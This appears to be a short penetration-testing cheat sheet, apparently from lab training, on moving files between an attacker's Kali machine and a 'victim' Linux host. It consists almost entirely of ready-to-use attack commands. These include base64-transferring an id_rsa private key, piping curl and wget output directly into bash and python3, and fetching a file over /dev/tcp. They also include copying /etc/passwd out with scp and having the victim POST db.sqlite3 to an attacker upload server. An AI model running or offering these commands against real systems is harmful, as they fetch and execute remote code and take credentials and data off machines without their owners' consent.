
#### Base64 Encode/Decode

On Kali:
```bash
md5sum id_rsa #take note of the hash value of the file

cat id_rsa | base64 -w 0;echo 
```

On Victim Linux:
```shell
echo -n '<BASE64 ENCODED STRING>' | base64 -d > id_rsa

md5sum id_rsa # check if md5 sum matches
```


#### Web Downloads with Wget and cURL

```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```


#### Fileless Downloads with Wget and cURL

```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


#### Download using bash dev tcp

```shell
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```


#### Secure Copy (SSH)

```shell
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

#### Upload Server
```bash
python -m venv myfirstproject
source myfirstproject/bin/activate
pip install uploadserver
python -m uploadserver 80

#command to upload from victim
curl -X POST http://192.168.45.224/upload -F 'files=@db.sqlite3'
```